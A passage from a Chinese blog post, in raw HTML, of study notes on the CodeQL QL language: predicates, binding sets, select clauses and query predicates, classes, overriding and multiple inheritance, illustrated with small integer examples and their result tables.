class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">9</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getName() &#123;   <span class="operator">/</span><span class="operator">/</span> <span class="number">3.</span> 特征谓词<span class="keyword">Member</span> predicate <span class="keyword">for</span> the class `FavoriteNumbers`</span><br><span class="line">    this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;one&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;four&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">9</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;nine&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="绑定行为-Bind-Behavior"><a href="#绑定行为-Bind-Behavior" class="headerlink" title="绑定行为(Bind Behavior)"></a>绑定行为(Bind Behavior)</h2><p>谓词必须在有限的时间内能运行完成，所以谓词只能包含有限数量的元组。<br>我的理解：翻译成<strong>限定行为</strong>可能更好些，限定谓词的参数属于有限的集合，否则有可能导致谓词的运行时间无限。<br>下面是无限谓词的示例：<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Compilation errors:</span></span><br><span class="line"><span class="comment">  ERROR: &quot;i&quot; is not bound to a value.</span></span><br><span class="line"><span class="comment">  ERROR: &quot;result&quot; is not bound to a value.</span></span><br><span class="line"><span class="comment">  ERROR: expression &quot;i * 4&quot; is not bound to a value.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> multiplyBy4(<span class="type">int</span> i) &#123;</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">*</span> <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Compilation errors:</span></span><br><span class="line"><span class="comment">  ERROR: &quot;str&quot; is not bound to a value.</span></span><br><span class="line"><span class="comment">  ERROR: expression &quot;str.length()&quot; is not bound to a value.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">predicate shortString(string str) &#123;</span><br><span class="line">  str.length() <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意，int，string等基本数据类型是无限类型，所以导致上述示例编译不通过。</p><h2 id="绑定集合-Binding-set"><a href="#绑定集合-Binding-set" class="headerlink" title="绑定集合(Binding set)"></a>绑定集合(Binding set)</h2><p>个人认为，翻译成限定集合更好。<br>如果预计在一组受限的参数上(已知参数范围)使用谓词，可使用bindingset[]显式指定受限的参数。<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bindingset[i]</span><br><span class="line"><span class="type">int</span> multiplyBy4(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">*</span> <span class="number">4</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">bindingset[str]</span><br><span class="line">  predicate shortString(string str) &#123;</span><br><span class="line">    str.length() <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, string y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">4</span> <span class="keyword">and</span> y <span class="operator">=</span>&quot;sdjf;sa&quot; <span class="keyword">and</span> shortString(y)</span><br><span class="line"><span class="keyword">select</span> multiplyBy4(x) <span class="keyword">as</span> mutiplyBy4_x, y <span class="keyword">as</span> filter_y</span><br></pre></td></tr></table></figure><br>Result:</p><table><thead><tr><th>mutiplyBy4_x</th><th>filter_y</th></tr></thead><tbody><tr><td>16</td><td>sdjf;sa</td></tr><tr><td><font color="red"> 当y的长度大于10时，返回结果为 <strong>空</strong> ，而不是预想的下述结果：</font></td><td></td></tr><tr><td>mutiplyBy4_x</td><td>filter_y</td></tr><tr><td>————</td><td>——–</td></tr><tr><td>16</td><td></td></tr><tr><td></td><td></td></tr><tr><td>当然，也可以为一个谓词的多个参数设置绑定集合，例如：</td><td></td></tr></tbody></table> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x] bindingset[y] <span class="operator">/</span><span class="operator">/</span>注意中间没有“,”</span><br><span class="line">predicate plusOne(<span class="type">int</span> x, <span class="type">int</span> y)&#123;</span><br><span class="line">    x <span class="operator">+</span> <span class="number">1</span> <span class="operator">=</span> y</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> plusOne(x, y)</span><br><span class="line"><span class="keyword">select</span> x , y</span><br></pre></td></tr></table></figure><p>Result:</p><table><thead><tr><th>x</th><th>y</th></tr></thead><tbody><tr><td>3</td><td>4</td></tr><tr><td>该谓词绑定的多个参数是相互独立的，上述代码表示（x和y的处理逻辑表明）：</td><td></td></tr></tbody></table><ul><li>如果x是限定的，那么x和y也是限定的。</li><li>如果y是限定的，那么x和y也是限定的。<br>即，<code>bindingset[x] bindingset[y]</code>表明x <strong>或</strong> y至少有一个是限定的。而 <code>bingdingset[x,y]</code>表明x <strong>和</strong> y 都必须是限定的，适用于具有多个输入参数的谓词。下面这个列子用来截取给定字符串str的前len个字符。 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bindingset[str, len]</span><br><span class="line">string <span class="keyword">truncate</span>(string str, <span class="type">int</span> len)&#123;</span><br><span class="line">  if str.length()<span class="operator">&gt;</span>len</span><br><span class="line">  <span class="keyword">then</span> <span class="keyword">result</span><span class="operator">=</span>str.prefix(len)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> str</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> string str, <span class="type">int</span> len</span><br><span class="line"><span class="keyword">where</span> str <span class="operator">=</span> &quot;Hello World&quot; <span class="keyword">and</span> len <span class="operator">=</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">truncate</span>(str, len) <span class="keyword">as</span> <span class="keyword">Result</span></span><br></pre></td></tr></table></figure>Result:<table><thead><tr><th>Result</th></tr></thead><tbody><tr><td>Hello</td></tr></tbody></table></li></ul><h2 id="数据库谓词-Database-Predicates"><a href="#数据库谓词-Database-Predicates" class="headerlink" title="数据库谓词(Database Predicates)"></a>数据库谓词(Database Predicates)</h2><p>CodeQL中的每个数据库中的表都涵盖了不同值之间的关系，当然表(database predicates)和QL中的其他谓词也相同。例如，如果数据库包含persons表，则可以编写<code>persons(x, firstName, _, age)</code> 将 x ，firstName 和 age约束为该表的第一、二、四列。唯一的区别是不能在QL中定义数据库谓词，它们是由底层数据库定义的。因此，查询不同语言的数据库使用的谓词也不相同。</p><h1 id="查询（Queries）"><a href="#查询（Queries）" class="headerlink" title="查询（Queries）"></a>查询（Queries）</h1><p>查询是QL程序的输出。给定一个查询模块，有如下两种查询方式：</p><ul><li>该模块定义的select子句。</li><li>该模块谓词命名空间中的所有查询谓词。这意味着，查询谓词可以定义在模块本身或其他模块。<br>通常把整个QL程序成为一个查询。</li></ul><h2 id="select子句（select-clauses）"><a href="#select子句（select-clauses）" class="headerlink" title="select子句（select clauses）"></a>select子句（select clauses）</h2><p>编写查询模块时，可以包含如下的select子句：<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="comment">/* ... variable declarations ... */</span></span><br><span class="line"><span class="keyword">where</span> <span class="comment">/* ... logical formula ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... expressions ... */</span></span><br></pre></td></tr></table></figure><br>select通常在末尾，from和where部分是可选的。<br>select子句还可以包括</p><ul><li><code>as NAME</code>,给查询的结果定义了“别名”，可以在后续的查询语句中</li><li><code>order by NAME [desc|asc]</code>，按照查询结果的某一列的NAME降序(增序)排列结果。<br>例如: <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x<span class="operator">*</span>y <span class="keyword">as</span> products, &quot;products:&quot; <span class="operator">+</span> products</span><br></pre></td></tr></table></figure>Result:<table><thead><tr><th>x</th><th>y</th><th>product</th><th></th></tr></thead><tbody><tr><td>3</td><td>0</td><td>0</td><td>product: 0</td></tr><tr><td>3</td><td>1</td><td>3</td><td>product: 3</td></tr><tr><td>3</td><td>2</td><td>6</td><td>product: 6</td></tr><tr><td><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> x, y, x<span class="operator">*</span>y <span class="keyword">as</span> products, &quot;products:&quot; <span class="operator">+</span> products <span class="keyword">order</span> <span class="keyword">by</span> y <span class="keyword">desc</span></span><br></pre></td></tr></table></figure></td><td></td><td></td><td></td></tr><tr><td>Result:</td><td></td><td></td><td></td></tr><tr><td>x</td><td>y</td><td>product</td><td></td></tr><tr><td>—</td><td>—</td><td>——-</td><td>———-</td></tr><tr><td>3</td><td>2</td><td>6</td><td>product: 6</td></tr><tr><td>3</td><td>1</td><td>3</td><td>product: 3</td></tr><tr><td>3</td><td>0</td><td>0</td><td>product: 0</td></tr></tbody></table></li></ul><h2 id="查询谓词（Query-Predicates）"><a href="#查询谓词（Query-Predicates）" class="headerlink" title="查询谓词（Query Predicates）"></a>查询谓词（Query Predicates）</h2><p>查询谓词是带有<code>query</code>注释的非成员谓词，返回谓词逻辑计算过程中的所有元组。例如：<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query <span class="type">int</span> getProduct(<span class="type">int</span> x, <span class="type">int</span> y)&#123;</span><br><span class="line">     x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>] <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> x <span class="operator">*</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Result：</p><table><thead><tr><th>x</th><th>y</th><th>result</th></tr></thead><tbody><tr><td>3</td><td>0</td><td>0</td></tr><tr><td>3</td><td>1</td><td>3</td></tr><tr><td>3</td><td>2</td><td>6</td></tr><tr><td>查询谓词的优点：</td><td></td><td></td></tr><tr><td>可以在代码的其他部分继续调用谓词，例如，可以在类里调用getProduct：</td><td></td><td></td></tr><tr><td><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class MultipleOfThree extends <span class="type">int</span> &#123;</span><br><span class="line">  MultipleOfThree() &#123; this <span class="operator">=</span> getProduct(_, _) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td><td></td><td></td></tr><tr><td>而select语句不能被反复调用。此外，将注释添加到查询谓词中可能使代码调试更方便。</td><td></td><td></td></tr></tbody></table><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>select语法和SQL语句中极为相似。</p><h1 id="数据类型-Data-Types"><a href="#数据类型-Data-Types" class="headerlink" title="数据类型(Data Types)"></a>数据类型(Data Types)</h1><h2 id="基本类型（Primitive-types）"><a href="#基本类型（Primitive-types）" class="headerlink" title="基本类型（Primitive types）"></a>基本类型（Primitive types）</h2><ul><li>boolean : 取true和false两种值。</li><li>float：64位浮点数。</li><li>int：补码表示的32位整数。</li><li>string：字符串类型。</li><li>date：日期类型（时间可选）。</li></ul><h2 id="类（Classes）"><a href="#类（Classes）" class="headerlink" title="类（Classes）"></a>类（Classes）</h2><p>除了基础的数据类型外，还可以在QL中实现自定义数据类型。一种简单有效的方法是定义一个类（class），从而使重用代码更加方便，程序更易读。例如：</p><ul><li>将相关的变量组合在一起。</li><li>基于上述变量来定义成员谓词（member predicates）。</li><li>重写上述成员谓词的子类。</li></ul><p>QL中的类并不重新创建一个对象，它仅表示一种逻辑关系。如果一个变量满足该逻辑关系，那么说该变量位于此类中。（该变量是类的一种实例？？？）</p><h3 id="类的定义（Defining-class）"><a href="#类的定义（Defining-class）" class="headerlink" title="类的定义（Defining class）"></a>类的定义（Defining class）</h3><p>一个类必须包含：</p><ul><li>关键字：<code>class</code>。</li><li>类名。大写字母开头的唯一标识。</li><li>类继承的父类（或基础类型）。</li><li>大括号{}包含的类体。<br>例如： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends <span class="type">int</span>&#123;</span><br><span class="line">    OneTwoThree()&#123; <span class="operator">/</span><span class="operator">/</span> characteristic predicate （特征[构造]函数）</span><br><span class="line">        this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">2</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    string getString()&#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate （成员函数）</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> &quot;Value is &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">    predicate isEven() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate （成员函数）</span><br><span class="line">        this <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>上述代码定义了名为<code>OneTwoThree</code>的类，它的值只能等于1，2或3。这是由它的特征谓词决定的。<code>OneTwoThree</code>拓展于<code>int</code>，是 <code>int</code>的子类。QL中的类至少拓展一个QL中的基本类型，类的值也是这些基本类型的交集。子类继承它父类（基本类型）的所有成员谓词。除此之外，QL中的类可以继承多个父类。注意：</li><li>类不能拓展它本身。</li><li>类不能拓展关键字<code>final</code>标注的类。</li><li>类拓展多个类型时，不能拓展不兼容弄的类。</li></ul><h3 id="类体-Class-Bodies"><a href="#类体-Class-Bodies" class="headerlink" title="类体(Class Bodies)"></a>类体(Class Bodies)</h3><p>类可以包含以下成员：</p><ul><li>一个特征谓词声明。</li><li>任何数量的成员谓词。</li><li>任何数量的字段声明。<br>注意，类继承父类的所有非私有谓词和字段，可以重写这些谓词和字段。</li></ul><h4 id="特征谓词（Characteristic-predicate）"><a href="#特征谓词（Characteristic-predicate）" class="headerlink" title="特征谓词（Characteristic predicate）"></a>特征谓词（Characteristic predicate）</h4><p>和类名相同的谓词，限定类的取值。</p><h4 id="成员谓词（Member-predicate）"><a href="#成员谓词（Member-predicate）" class="headerlink" title="成员谓词（Member predicate）"></a>成员谓词（Member predicate）</h4><p>成员谓词适用于特定类的成员，满足类特征谓词定义的逻辑关系的值可以调用该谓词。（相当于面向对象语言中类的实例化对象调用成员函数）。例如：<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> OneTwoThree <span class="keyword">one</span></span><br><span class="line"><span class="keyword">where</span> <span class="keyword">one</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> one.getString()</span><br></pre></td></tr></table></figure><br>Result:</p><table><thead><tr><th>#</th><th>[0]</th></tr></thead><tbody><tr><td>1</td><td>Value is 1</td></tr></tbody></table><p>上述方法确保<code>1</code>不仅仅是<code>int</code>变量，还属于类<code>OneTwoThree</code>。成员谓词非常有用，因为可以调用多个。例如：<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> OneTwoThree <span class="keyword">one</span></span><br><span class="line"><span class="keyword">where</span> <span class="keyword">one</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> one.getString().toUpperCase()</span><br></pre></td></tr></table></figure><br>Result:</p><table><thead><tr><th>#</th><th>[0]</th></tr></thead><tbody><tr><td>1</td><td>VALUE IS 1</td></tr><tr><td>注意：特征谓词和成员谓词中经常用到<code>this</code>，表示类的实例。在特征谓词中，用来约束类的值。在成员谓词中，和其他谓词中变量起到的作用一样。</td><td></td></tr></tbody></table><h4 id="字段（Field）"><a href="#字段（Field）" class="headerlink" title="字段（Field）"></a>字段（Field）</h4><p>字段是声明在类体中的变量。一个类的类体中可以包含多个字段，类体中的谓词可以调用这些字段。例如：<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class <span class="type">SmallInt</span> extends <span class="type">int</span>&#123;</span><br><span class="line">    <span class="type">SmallInt</span>()&#123;this <span class="operator">=</span> [<span class="number">1</span> .. <span class="number">10</span>]&#125;</span><br><span class="line">&#125;</span><br><span class="line">class DivisibleInt extends <span class="type">SmallInt</span>&#123;</span><br><span class="line">    <span class="type">SmallInt</span> divisor; <span class="operator">/</span><span class="operator">/</span> 声明一个<span class="type">SmallInt</span>类型的变量divisor</span><br><span class="line">    DivisibleInt()&#123;</span><br><span class="line">        this <span class="operator">%</span> divisor <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">SmallInt</span> getDivisor()&#123;</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> divisor</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> DivisibleInt i</span><br><span class="line"><span class="keyword">select</span> i, i.getDivisor()</span><br></pre></td></tr></table></figure><br>Result:</p><table><thead><tr><th>#</th><th>i</th><th>[1]</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td></tr><tr><td>2</td><td>2</td><td>1</td></tr><tr><td>3</td><td>2</td><td>2</td></tr><tr><td>4</td><td>3</td><td>1</td></tr><tr><td>5</td><td>3</td><td>3</td></tr><tr><td>6</td><td>4</td><td>1</td></tr><tr><td>7</td><td>4</td><td>2</td></tr><tr><td>8</td><td>4</td><td>4</td></tr><tr><td>9</td><td>5</td><td>1</td></tr><tr><td>10</td><td>5</td><td>5</td></tr><tr><td>11</td><td>6</td><td>1</td></tr><tr><td>12</td><td>6</td><td>2</td></tr><tr><td>13</td><td>6</td><td>3</td></tr><tr><td>14</td><td>6</td><td>6</td></tr><tr><td>15</td><td>7</td><td>1</td></tr><tr><td>16</td><td>7</td><td>7</td></tr><tr><td>17</td><td>8</td><td>1</td></tr><tr><td>18</td><td>8</td><td>2</td></tr><tr><td>19</td><td>8</td><td>4</td></tr><tr><td>20</td><td>8</td><td>8</td></tr><tr><td>21</td><td>9</td><td>1</td></tr><tr><td>22</td><td>9</td><td>3</td></tr><tr><td>23</td><td>9</td><td>9</td></tr><tr><td>24</td><td>10</td><td>1</td></tr><tr><td>25</td><td>10</td><td>2</td></tr><tr><td>26</td><td>10</td><td>5</td></tr><tr><td>27</td><td>10</td><td>10</td></tr><tr><td>在上述例子中，声明了一个SmallInt类型的变量divisor，并在特征谓词SmallInt(or DIvisibleInt)中约束它的取值，在成员谓词getDivisor中使用它。有点类似select子句和from的关系。</td><td></td><td></td></tr></tbody></table><h3 id="实体类（Concrete-Classes）"><a href="#实体类（Concrete-Classes）" class="headerlink" title="实体类（Concrete Classes）"></a>实体类（Concrete Classes）</h3><p>上述介绍的所有类都是实体类，它们通过特征谓词，限定了较为广泛的类型（int .etc）的取值。属于基础类型的子集。</p><h3 id="抽象类（Abstract-Classes）"><a href="#抽象类（Abstract-Classes）" class="headerlink" title="抽象类（Abstract Classes）"></a>抽象类（Abstract Classes）</h3><p>抽象类是<code>abstract</code>修饰的类，它对广泛的类型的取值做了限制。然而，抽象类的取值是它子类的<strong>并集</strong>。如果一个值属于一个抽象类，那么他必须满足该抽象类的特征谓词的关系和一个抽象类子类中的的特征谓词。<br>抽象类适用于将多个现有类组合在一个通用名称下的情形，然后在抽象类上定义适用于所有子类的成员谓词。还可以扩展预定义的抽象类，例如：如果导入的库中包含抽象类，你可以定义该抽象类的子类来拓展它。<br>例如：<br>如果要编辑一个安全查询，那么可能会涉及到查询特定的SQL表达式，则可以用下述方法来描述这些表达式。<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SqlExpr</span> <span class="keyword">extends</span> <span class="title class_">Expr</span>&#123;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>现在就可以针对不同的数据库管理系统定义相应的子类。例如，你可以定义子类 <code>PostgresSqlExpr extends SqlExopr</code> ，它仅针对查询执行数据库查询的某些<code>PostApi</code>的表达式。当然，还可以为Mysql和其他数据库管理系统定义类似的子类。<br>抽象类<code>SqlExpr</code>可以引用所有的子类中的表达式，如果以后要添加对另一个数据库系统的支持，则仅需要新建一个拓展抽象类<code>SqlExpr</code>的子类即可。这极大的提高了查询语句的复用性。<br>注意：添加子类并不是一个孤立的更改，它拓展了抽象类。所以将新的子类添加到抽象类时，必须十分谨慎。</p><h2 id="重写成员谓词（Overriding-member-predicates）"><a href="#重写成员谓词（Overriding-member-predicates）" class="headerlink" title="重写成员谓词（Overriding member predicates）"></a>重写成员谓词（Overriding member predicates）</h2><p>子类可以重写父类的成员谓词。重写成员谓词时，需要在子类中定义一个和父类中成员谓词相同名称的谓词，并添加<code>override</code>注解。这适用于优化谓词，从而为子类中的值提供更加具体的结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class OneTwo extends OneTwoThree&#123;</span><br><span class="line">    OneTwo()&#123;</span><br><span class="line">        this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">    override string getString()&#123;</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> &quot;One or Two : &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> OneTwoThree o</span><br><span class="line"><span class="keyword">select</span> o,o.getString()</span><br></pre></td></tr></table></figure><p>成员谓词<code>getString</code>被重写， 覆盖父类的成员函数，且select子句会使用”最精确“的谓词<code>getString()</code>，因此，结果如下：</p><table><thead><tr><th>#</th><th>o</th><th>[1]</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>One or Two : 1</td></tr><tr><td>2</td><td>2</td><td>One or Two : 2</td></tr><tr><td>3</td><td>3</td><td>Value is 3</td></tr><tr><td>QL程序和其他面向对象的语言不同，相同类型不同的子类型不需要相互独立（disjoint，可以存在交集）。例如，可以定义另外一个<code>OneTwoThree</code>的子类<code>TwoThree</code>，和<code>OneTwo</code>有重叠。</td><td></td><td></td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TwoThree</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span>&#123;</span><br><span class="line">    TwoThree()&#123;</span><br><span class="line">        <span class="built_in">this</span> = <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    override string <span class="title function_">getString</span><span class="params">()</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;Two or Three :&quot;</span> + <span class="built_in">this</span>.getString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">from OneTwoThree o</span><br><span class="line">select o,o.getString()</span><br></pre></td></tr></table></figure><p>两个子类<code>Onetwo</code>和<code>TwoThree</code>都包含”2“，且两个子类都重写了<code>getString()</code>谓词。因此，有两个”最精确“的谓词定义，所以运行上述代码，得到的结果如下：</p><table><thead><tr><th>#</th><th>o</th><th>[1]</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>One or Two : 1</td></tr><tr><td>2</td><td>2</td><td>One or Two : 2</td></tr><tr><td>3</td><td>2</td><td>Two or three: 2</td></tr><tr><td>4</td><td>3</td><td>Two or three: 3</td></tr></tbody></table><h2 id="多重继承（Multiple-inheritance）"><a href="#多重继承（Multiple-inheritance）" class="headerlink" title="多重继承（Multiple inheritance）"></a>多重继承（Multiple inheritance）</h2><p>一个类可以有拓展多个父类，它继承多个父类的逻辑关系，即父类值得交集。例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Two extends OneTwo,TwoThree&#123;</span><br><span class="line">    override string getString()&#123;</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> &quot;Two : &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> Two two</span><br><span class="line"><span class="keyword">select</span> two</span><br></pre></td></tr></table></figure><p><code>Two</code>的值必须满足<code>OneTwo</code>和<code>TwoThree</code>中所有的逻辑属性（特征谓词），上例中，<code>Two</code>只有一个取值：2。<code>Two</code>类继承了<code>OneTwo</code>和<code>TwoThree</code>，当然它还简介继承了<code>OneTwoThree</code>和<code>int</code>。<br>提示：如果子类拓展的多个父类有相同的成员谓词，那么，为了避免歧义，该子类必须重写父类中相同的成员谓词。超级表达式（super expression）非常适用于该情形（待学习）。</p><h2 id="字符类型和类域类型（Character-types-and-class-domain-types）"><a href="#字符类型和类域类型（Character-types-and-class-domain-types）" class="headerlink" title="字符类型和类域类型（Character types and class domain types）"></a>字符类型和类域类型（Character types and class domain types）</h2><p>（难以理解，回头在看一遍）<br>虽然QL中的每个类都隐式定义了一个字符类型和类域类型，但并不能直接引用这些类型。（在实际编写查询语句时，这些概念并不经常使用。）</p><ul><li>QL类中的 <strong>字符类型</strong> 是满足特征谓词的一组值，字符类型是类域类型的子集。当且仅当一个值属于字符类型时，该值才属于该类（相当于类的一个实例，这种说法也不严谨）。抽象类不仅要属于字符类型，它还必须有属于一个子类（有一个子类）。</li><li>QL类中的 <strong>类域类型</strong> 是所有超类型的字符类型的交集，即如果一个值属于域类型，那么它一定属于每个超类型（super class ?），它是类的特征谓词中的<code>this</code>。</li></ul><h2 id="代数数据类型（Algebraic-datatypes）"><a href="#代数数据类型（Algebraic-datatypes）" class="headerlink" title="代数数据类型（Algebraic datatypes）"></a>代数数据类型（Algebraic datatypes）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span 